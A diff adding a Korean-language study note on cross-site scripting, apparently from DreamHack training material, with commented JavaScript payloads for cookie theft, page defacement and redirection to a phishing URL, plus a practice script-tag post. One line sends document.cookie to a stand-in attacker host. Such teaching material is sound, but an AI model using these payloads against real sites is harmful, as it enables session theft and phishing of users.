@@ -1,0 +1,41 @@
+Cross site Scripting 공격
+
+XSS 공격과 같은 경우 필터나 웹 방화벽 등에 따라 그 영향이 제한될 수 있으나 
+이를 우회할 수 있는 여러 테크닉이 존재하며, URL 변조 등 공격이 가해질 수 있는 지점(공격 벡터) 또한 다양합니다.
+
+- 쿠키 및 세션 공격
+<script>
+// "hello" 문자열 alert 실행.
+alert("hello");
+// 현재 페이지의 쿠키(return type: string)
+document.cookie; 
+// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
+alert(document.cookie);
+// 쿠키 생성(key: name, value: test)
+document.cookie = "name=test;";
+// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
+// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
+new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
+</script>
+
+- 페이지 변조
+<script>
+// 사용자의 페이지 정보에 접근.
+document;
+// 사용자의 페이지에 데이터를 삽입.
+document.write("Hacked By DreamHack !");
+</script>
+
+- 위치 이동
+<script>
+// 사용자의 위치를 변경.
+// 피싱 공격 등으로 사용됨.
+location.href = "http://hacker.dreamhack.io/phishing"; 
+// 새 창 열기
+window.open("http://hacker.dreamhack.io/")
+</script>
+
+실습 :
+    제목 : 123
+    내용 : <script>alert("hello")</script>
+    작성하기 버튼
